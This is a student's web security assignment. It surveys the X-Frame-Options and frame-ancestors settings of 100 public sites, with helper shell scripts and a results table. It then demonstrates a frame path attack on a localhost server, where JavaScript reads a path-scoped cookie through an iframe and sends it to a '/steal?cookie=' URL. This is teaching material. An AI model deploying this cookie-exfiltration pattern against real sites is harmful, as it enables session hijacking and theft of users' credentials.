Joshua Murphy

CS 595 - Web Security

Assignment 4 

<br/>

## Assignment Description Part 1 - Which public sites are framable?

<br/>

### Description of methods used to discover which URLs were framable

To start with, I added a new view to the server called "iframe-html-pages.ejs", which contains links for all 100
URLs that are trying to be iframed on the site, with each one being labeled as "html-$n.ejs" where $n is the number 
of the URL.

Next, due to the number of html pages needed, I created several shell scripts to help with the monotony of it.

First, create_ejs_files.sh reads in the 100-sites.txt file, creates an ejs file with the required html needed to 
embed an iframe on the page, and passes in each line of the text to be used as the 
iframe src in the html, and then names the file based on wat the number of the line is, starting at 1. It also contains 
a function to help automate the process of determining whether or not an iframe was successful or not, although it does 
produce some false negatives, as some iframes would load, but it would claim it failed and that the length was 0. Due to 
this I had to manually check how many were actually successful and which were not.

    #!/bin/bash

    path_file=$1
    n=1

    while IFS=$' \t\n\r' read -r line;
        do
            line=$line
            echo "reading $n: $line"
            file="html-$n.ejs"
            echo "<!doctype html>
    <head>
        <body>
            <a href='/iframe-html-pages'>Back</a>
            <script>
                function checkload() {
                    const loaded = document.getElementById('checkme').contentWindow.window.length;
                    
                    if (loaded == 0) {
                            const node = document.createElement('p');
                            const textnode = document.createTextNode('failed, loaded = ' + loaded);
                            node.appendChild(textnode);
                            document.getElementById('resultHere').appendChild(node);
                    } else if (loaded > 0) {
                            const node = document.createElement('p');
                            const textnode = document.createTextNode('succeeded, loaded = ' + loaded);
                            node.appendChild(textnode);
                            document.getElementById('resultHere').appendChild(node);
                    }
                }
            </script>
        </body>
    </head>
    <div id='resultHere'></div>
    <iframe onload='checkload()' id='checkme' src='https://www.$line/'></iframe>" >> views/html-$n.ejs

            n=$((n+1))
            printf "\n"
        done <$path_file

<br/>

Next, to add the routes to the server, I created "add_app_get.sh", which 
starts at 1, and while n is less than 100, it prints the route code to 
a text file, and repeats the process until the complete condition is met.
I then just copied and pasted the results to the server.js file.

    #!/bin/bash

    n=1

    while [ $n -le 100 ];
        do
            echo -e "app.get('/html-$n', (req, res) => {
                res.render('html-$n')
            }) \n" >> app_getters_for_html.txt

            n=$((n+1))
        done

<br/>

Finally, I created a script that used several grep commands, looking for the 
"x-frame-options" set in each terminating response from the previous assignment, 
and print the result to the screen. It also uses the same method to count the number 
of options that are set to "DENY", "SAMEORIGIN", "ALLOWALL", and "ALLOW-FROM", as 
those were thee four settings used in my 100 URLs. I still had some missing values
after this, so I just went and manually looked at what each remaining pages 
iframe options were set to.

    #!/bin/bash

    grep -ir 'x-frame' curl_responses/* | tac | sort -u -t: -k1,1
    echo -e "\n"

    echo "-n" "Total number of x-frame-options set: "
    grep -ir 'x-frame' curl_responses/* | tac | sort -u -t: -k1,1 | wc -l 

    echo "-n" "Set to DENY: "
    grep -ir 'x-frame-options: deny' curl_responses/* | tac | sort -u -t: -k1,1 | wc -l

    echo "-n" "Set to SAMEORIGIN: "
    grep -ir 'x-frame-options: sameorigin' curl_responses/* | tac | sort -u -t: -k1,1 | wc -l

    echo "-n" "Set to ALLOWALL: "
    grep -ir 'x-frame-options: allowall' curl_responses/* | tac | sort -u -t: -k1,1 | wc -l

    echo "-n" "Set to ALLOW-FROM: "
    grep -ir 'x-frame-options: allow-from' curl_responses/* | tac | sort -u -t: -k1,1 | wc -l

<br/>

lastly, I came up with a script that would take a screenshot of each URL page on the localhost:4000
server, by incrementing up one number starting at 1, and replacing $n with the corresponding number.

    n=1
    while [ $n -le 100 ];
        do
            echo "Writing file #$n."
            /cygdrive/c/Progra~2/Google/Chrome/Application/./chrome --disable-gpu --screenshot=iframe-imgs/html-$n.png --headless http://localhost:4000/html-$n

            n=$((n+1))
        done

<br/>


### Table 

The following is the table of the information of the URLs used, which 
ones allowed the embedding of an iframe, and what the options were set to 
for said site. If they allowed for said site to be framed, and what the options
were set to, as well as comments.

<br/>

|URL                   |iFrame allowed|x-frame-options                                                     |
|----------------------|------|----------------------------------------------------------------------------|
|about.com             |      |SAMEORIGIN                                                                  |
|akamaized.net         |404   |                                                                            |
|alexa.com             |      |SAMEORIGIN                                                                  |
|alibaba.com           |O     |                                                                            |
|amazon.fr             |      |SAMEORIGIN                                                                  |
|amazon.it             |      |SAMEORIGIN                                                                  |
|asahi.com             |O     |                                                                            |
|asus.com              |      |SAMEORIGIN                                                                  |
|bandcamp.com          |O     |                                                                            |
|bbc.co.uk             |      |DENY (was able to iframe on 3/10/22, even though it was set to deny with no special changes)|
|bbc.com               |O     |                                                                            |
|bp3.blogger.com       |404   |                                                                            |
|brandbucket.com       |      |SAMEORIGIN                                                                  |
|businessinsider.com   |      |SAMEORIGIN                                                                  |
|buzzfeed.com          |      |SAMEORIGIN                                                                  |
|cnbc.com              |      |content-security-policy: frame-ancestors 'self'                             |
|cnil.fr               |      |SAMEORIGIN                                                                  |
|cointernet.com.co     |O     |                                                                            |
|debian.org            |      |SAMEORIGIN                                                                  |
|depositfiles.com      |      |SAMEORIGIN                                                                  |
|dot.tk                |O     |                                                                            |
|draft.blogger.com     |      |SAMEORIGIN                                                                  |
|drive.google.com      |      |DENY                                                                        |
|dropbox.com           |      |DENY                                                                        |
|dw.com                |O     |                                                                            |
|ea.com                |      |SAMEORIGIN                                                                  |
|ebay.co.uk            |      |SAMEORIGIN                                                                  |
|elmundo.es            |O     |                                                                            |
|elpais.com            |O     |                                                                            |
|en.wikipedia.org      |O     |                                                                            |
|enable-javascript.com |O     |                                                                            |
|etsy.com              |      |SAMEORIGIN                                                                  |
|evernote.com          |      |SAMEORIGIN                                                                  |
|fb.me                 |      |DENY                                                                        |
|feedburner.com        |      |DENY                                                                        |
|files.wordpress.com   |      |SAMEORIGIN                                                                  |
|finance.yahoo.com     |      |SAMEORIGIN                                                                  |
|focus.de              |O     |                                                                            |
|francetvinfo.fr       |O     |                                                                            |
|guardian.co.uk        |      |SAMEORIGIN                                                                  |
|harvard.edu           |      |SAMEORIGIN                                                                  |
|hugedomains.com       |      |ALLOW-FROM https://hugedomains.com/                                         |
|id.wikipedia.org      |O     |                                                                            |
|imgur.com             |      |DENY                                                                        |
|independent.co.uk     |      |content-security-policy: frame-ancestors 'self' https://*.brightsites.co.uk;|
|instagram.com         |      |SAMEORIGIN                                                                  |
|interia.pl            |O     |                                                                            |
|kakao.com             |O     |                                                                            |
|kompas.com            |      |SAMEORIGIN(was able to frame on 3/13/22 23:40 UTC)                          |
|last.fm               |      |SAMEORIGIN                                                                  |
|latimes.com           |      |DENY                                                                        |
|leparisien.fr         |O     |                                                                            |
|lg.com                |      |frame-ancestors 'self' www.lgechat.com lgechat.com;                         |
|m.wikipedia.org       |404*  |200 when curling, but cannot find page when in or out of iframe             |
|mega.nz               |      |DENY                                                                        |
|mozilla.com           |      |DENY                                                                        |
|msn.com               |      |SAMEORIGIN                                                                  |
|nature.com            |      |DENY                                                                        |
|naver.com             |      |DENY                                                                        |
|nba.com               |      |SAMEORIGIN                                                                  |
|netflix.com           |      |DENY                                                                        |
|netvibes.com          |      |DENY                                                                        |
|networkadvertising.org|O     |                                                                            |
|nhk.or.jp             |O     |                                                                            |
|nydailynews.com       |O     |                                                                            |
|ovh.com               |      |SAMEORIGIN                                                                  |
|pcmag.com             |O     |                                                                            |
|photobucket.com       |O     |                                                                            |
|pinterest.com         |      |SAMEORIGIN                                                                  |
|play.google.com       |      |SAMEORIGIN                                                                  |
|reuters.com           |O     |                                                                            |
|rfi.fr                |      |DENY                                                                        |
|rtve.es               |O     |                                                                            |
|ru.wikipedia.org      |O     |                                                                            |
|search.google.com     |      |SAMEORIGIN                                                                  |
|sedo.com              |      |SAMEORIGIN                                                                  |
|soratemplates.com     |O     |SAMEORIGIN when curled                                                      |
|spiegel.de            |O     |                                                                            |
|spotify.com           |      |DENY                                                                        |
|ssl-images-amazon.com |404   |                                                                            |
|telegram.me           |      |SAMEORIGIN                                                                  |
|thoughtco.com         |      |content-security-policy: frame-ancestors 'self'                             |
|time.com              |      |SAMEORIGIN                                                                  |
|trustpilot.com        |      |DENY                                                                        |
|twimg.com             |404   |                                                                            |
|ucoz.ru               |      |SAMEORIGIN                                                                  |
|upenn.edu             |      |SAMEORIGIN                                                                  |
|usgs.gov              |      |SAMEORIGIN                                                                  |
|usnews.com            |O     |                                                                            |
|video.google.com      |      |SAMEORIGIN, HTTP Strict Transport Secuirty (HSTS)                           |
|wa.me                 |      |DENY                                                                        |
|washington.edu        |O     |                                                                            |
|wikia.com             |      |SAMEORIGIN                                                                  |
|wiley.com             |      |SAMEORIGIN                                                                  |
|wired.com             |O     |                                                                            |
|gov.uk                |O     |ALLOWALL                                                                    |
|over-blog.com         |      |DENY                                                                        |
|weebly.com            |      |SAMEORIGIN                                                                  |
|youtube.com           |      |SAMEORIGIN                                                                  |
|zoom.us               |      |SAMEORIGIN                                                                  |


</br>

I will preface that I've decided to only mark down the URLs that were able to be 
consistently framed, however, I did note in the third column if a URL was inconsistent with
allowing frames. This table is current as of 3/13/2022 at 23:47 UTC.

<br/>


Of the 100 URLs, 46 of them had the "x-frame-options" set to sameorigin, meaning 
that they would only allow for the framing of the site only if they are of the 
same origin, 4 of which instead set the same origin by declaring the frame-ancestors 
in the content-security-policy, 18 out right deny any from of framing, and set to allow-from said URL, which in itself is a sort of sameorigin policy. 29 of the URLs allowed for iframing, 1 of which did so by setting the frame options to "allowall". 
Finally, there were 5 sites that were unable to load for varying reasons. Of the 
31 URLs that were able to be iframed, 1, soratemplates.com, had the option set to 
sameorigin, but I was still able to iframe the website, which no extra steps 
taken on my end to bypass said sameorigin policy. The 5 sites that were 
not able to load were akamaized.net, bp3.blogger.com, m.wikipedia.org, ssl-images-amazon.com,
and twimg.com.

The most common way to defeat an iframe attempt by websites was to either set 
the x-frame-options to sameorigin, or deny outright. A few of the URLs would
instead set the frame-ancestor to self, and hugedomains.com specified itself 
as a domain allowed to iframe.

Interestingly, I originally gathered the information presented above on March 10th, 2022. As of March 13th, 2022 There 
were actually two changes I noticed right away. First, bbc.co.uk is no longer iframable, which makes sense given that it
was set to DENY when curling, yet I was allowed to iframe it with no special changes. Unfortunately I do not have 
proof of this, as I had not come up with taking screenshots of a page as an alternative to looking at the html
at that time. Second, Kompas.com was iframable for a 
short time, as I have a screenshot of it in the iframe-imgs at number 49, how ever it is now back to being not framable, as it
originally was, being set to SAMEORIGIN. Having waited about 5 minitues, Kompas.com is now iframable again, despite still having 
it's x-frame-options not change(see curl_responses file/kompas.com.txt), so I'm unsure why it keeps changing.

<br />

## Assignment Description part 2 - Frame Path attack

For the second part of this assignment, I followed much of what was discussed in the week 3 lecture about the path 
variable being used in a cookie. Paths don't actually offer much security in a cookie, because they can be bypassed
using the Document Object Model (DOM) by creating an iframe element with the path of said cookie, and then accessing it
via the contentDocument.cookie property. For this part, I set up two ejs files, one called cookie.ejs, and the other
frame-path-attack.ejs. The cookie.ejs file creates a cookie that contains a path set to "/cookie", and then sets it.

    <!doctype html>
    <head>
        <body>
            <a href='/'>Back</a>
            <script type = "text/javascript">
                document.cookie = "path=/cookie;";
                document.write(document.cookie)
            </script>
        </body>
    </head>

Next, frame-path-attack.ejs writes a blank document.cookie, creates an iframe of cookie.ejs, and then waits 5000 milliseconds
before accessing the contentDocument.cookie of the iframe, and if successful, appends the cookie to it. The result will
be a GET response that then contains the cookie in it, which can be viewed in the case of this demo, through 
the Web Developer Tools, though you could also set this up to ping a server.

    <!doctype html>
    <head>
        <body>
            <a href='/'>Back</a>
            <p></p>
            <script>
                document.cookie = ''
                const iframe = document.createElement('iframe')
                iframe.src = 'http://localhost:4000/cookie'
                document.body.appendChild(iframe)


                setTimeout(function() {
                    const p = document.createElement('p')
                    p.innerHTML = iframe.contentDocument.cookie
                    document.body.appendChild(p)

                    new Image().src = 'http://localhost:4000/steal?cookie=' + iframe.contentDocument.cookie
                }, 5000);


            </script>
        </body>
    </head>

<br/>

## Video Links

Assignment 4 Part 1 - https://www.youtube.com/watch?v=JHhDf9_i96E

Assignment 4 Part 2 - https://www.youtube.com/watch?v=e2nLtmYSNH4

Assignment 4 Playlist - https://www.youtube.com/playlist?list=PLQ_PLRjJduEhxkc1jD685D8Ek_kotheLQ

<br/>

## Extra Credit

Week 5 lecture, slide 64 has a literary reference in its title. To what work does that reference refer?

"Parsers, parsers, everywhere!"

The phrase "x, x everywhere!" seems to have it's origins from the poem "The Rime of the Ancient Mariner" by Samuel Taylor Coleridge,
first published in 1798. The full phrase is "Water, water every where, / Nor any drop to drink" which seems to reference thee fact
that they are surrounded by water, as the character is stranded at sea, yet it is not drinkable as it is salt water, and would only
cause you to become more dehydrated. Personally, I actually know this better as a meme, that features two characters from Toy Story, with
one, the character Buzz Lightyear, with his shoulder over the other character Woody, with the words "X, X everywhere!" printed on the image.
The phrase is relevant for this slide as it talks about the multiple different parsers that are used and called on even for just one html page,
such as the HTML parser, JavaScript and CSS parsers.


# References

1.) Cookie Security - https://developer.mozilla.org/en-US/docs/Web/API/Document/cookie

2.) Rime of the Ancient Mariner - https://en.wikipedia.org/wiki/The_Rime_of_the_Ancient_Mariner

3.) CSV to Markdown - https://www.convertcsv.com/csv-to-markdown.htm